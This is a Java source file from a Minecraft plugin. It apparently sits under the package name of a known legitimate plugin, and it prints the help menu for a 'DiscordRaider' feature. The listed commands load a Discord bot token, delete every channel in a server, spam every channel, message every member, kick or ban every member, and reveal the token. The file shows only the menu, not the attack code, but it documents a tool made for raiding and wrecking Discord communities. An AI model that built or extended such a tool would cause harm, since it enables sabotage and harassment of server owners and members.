package net.milkbowl.vault.commands.cmds.help;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.methods.Tips;
import net.milkbowl.vault.util.Settings;

public class DiscordRaider extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		int maxPages = 1;
		if (args.length <= 1) {
			p.sendMessage(Settings.USAGE("discordraider <1-" + maxPages + ">"));
		} else {
			if (args[1].equalsIgnoreCase("1")) {
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------"));
				p.sendMessage("         "+Settings.PRIMARY_COLOUR + Settings.NAME + " by " + Settings.AUTHOR);
				p.sendMessage("");
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7settoken &8l &fSet bots token and logins to bot"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7setguild &8l &fSet guild ID"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7delchannels &8l &fDeletes all channels in the guild"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7createvc &8l &fCreates a voice channel"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7createtc &8l &fCreates a text channel"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7spamdiscord &8l &fSpams all channels"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7dmall &8l &fPrivate messages all users"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7kickusers &8l &fKicks all users from the guild"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7banusers &8l &fBans all users from the guild"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7setstatus &8l &fSets the bots playing status"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7showtoken &8l &fShows the token of the discord bot"));
				p.sendMessage("");
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8("+Settings.PRIMARY_COLOUR+"Tip&8) l &7" + Tips.getTip()));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------"));
			}
		}
	}

}
